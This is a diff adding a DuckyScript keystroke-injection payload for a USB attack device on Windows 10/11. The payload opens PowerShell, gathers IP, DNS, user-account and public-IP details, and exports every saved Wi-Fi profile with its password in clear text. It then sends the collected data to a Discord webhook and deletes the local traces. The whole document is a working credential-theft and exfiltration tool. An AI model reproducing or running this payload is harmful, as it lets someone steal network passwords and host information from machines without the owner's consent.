@@ -1,0 +1,74 @@
+REM Author:         Krauthaus, with IP, User Account, Public IP, and Wi-Fi info additions
+REM Version:        2.5
+REM Target:         Windows 10/11 (CMD + Powershell)
+
+DELAY 500
+GUI r
+DELAY 200
+STRING powershell
+ENTER
+DELAY 1000
+
+REM Check if the directory already exists, if not, create it
+STRING if (-Not (Test-Path "$env:temp\p")) {md "$env:temp\p"}; cd "$env:temp\p";
+ENTER
+DELAY 200
+
+REM Clear any previous stats.txt if it exists
+STRING if (Test-Path "stats.txt") {Remove-Item "stats.txt"};
+ENTER
+DELAY 200
+
+REM Collecting and structuring IP and network information with consistent formatting
+STRING $script='"IP Information:" | Out-File stats.txt -Append; Get-NetIPAddress -AddressFamily IPv4 | Select-Object IPAddress,PrefixLength,DefaultGateway | where IPAddress -notmatch ''(127.0.0.1|169.254.\d+.\d+)'' | Out-File stats.txt -Append;'
+ENTER
+DELAY 500
+
+REM DNS Servers Section, filtering out duplicates
+STRING $script+='"nDNS Servers:" | Out-File -Append stats.txt; (Get-DnsClientServerAddress | Select-Object -ExpandProperty ServerAddresses | Sort-Object -Unique) | Out-File -Append stats.txt;'
+ENTER
+DELAY 500
+
+REM Wi-Fi Profiles and Passwords Section with consistent formatting
+STRING $script+='"nWi-Fi Profiles and Passwords:" | Out-File -Append stats.txt; netsh wlan export profile key=clear >$null;'
+ENTER
+DELAY 500
+
+REM Filter for XML files only and extract Wi-Fi names and passwords
+STRING $script+='$r=Get-ChildItem -Filter "*.xml" | %{$Xml=[xml](gc $_.FullName); [PSCustomObject]@{Name=$Xml.WLANProfile.Name;Password=$Xml.WLANProfile.MSM.Security.SharedKey.KeyMaterial}}; $r | Format-Table -AutoSize | Out-File -Append stats.txt;'
+ENTER
+DELAY 500
+
+REM User Accounts Section with consistent formatting
+STRING $script+='"nUser Accounts:" | Out-File -Append stats.txt; Get-WmiObject -Class Win32_UserAccount | Select-Object -ExpandProperty Name | Out-File -Append stats.txt;'
+ENTER
+DELAY 500
+
+REM Public IP Section with consistent formatting
+STRING $script+='"nPublic IP:" | Out-File -Append stats.txt; $publicIP = Invoke-RestMethod -Uri "http://ifconfig.me/ip"; "Public IP: $publicIP" | Out-File -Append stats.txt;'
+ENTER
+DELAY 500
+
+REM Reading and sending the contents of stats.txt to Discord with delay to avoid rate-limiting
+STRING $script+='$filecontent = Get-Content ".\stats.txt" -Raw;'
+ENTER
+DELAY 500
+
+REM Add delay between requests to prevent rate-limiting
+STRING $script+='try { $chunks = [regex]::split($filecontent, "(?<=.{1900})"); foreach ($chunk in $chunks) { $Body=@{ content = "$env:computername Stats from Ducky/Picon$chunk"}; Invoke-RestMethod -ContentType ''Application/Json'' -Uri "YOUR_DISCORD_WEBHOOK_SHOULD_BE_REPLACED_HERE_BETWEEN_QUOTES" -Method Post -Body ($Body | ConvertTo-Json); Start-Sleep -Seconds 1; }} catch { Write-Output $_; Start-Sleep -Seconds 10; }'
+ENTER
+DELAY 500
+
+REM Clean up and exit, but delay to show errors
+STRING $script+='try { Remove-Item ".\stats.txt"; } catch { Write-Output "Error during cleanup: $_"; Start-Sleep -Seconds 10; };'
+ENTER
+DELAY 500
+
+REM Add delay at the end to allow you to see any errors
+STRING $script+='Start-Sleep -Seconds 20'
+ENTER
+DELAY 500
+
+REM Execute the PowerShell script
+STRING Invoke-Expression $script
+ENTER
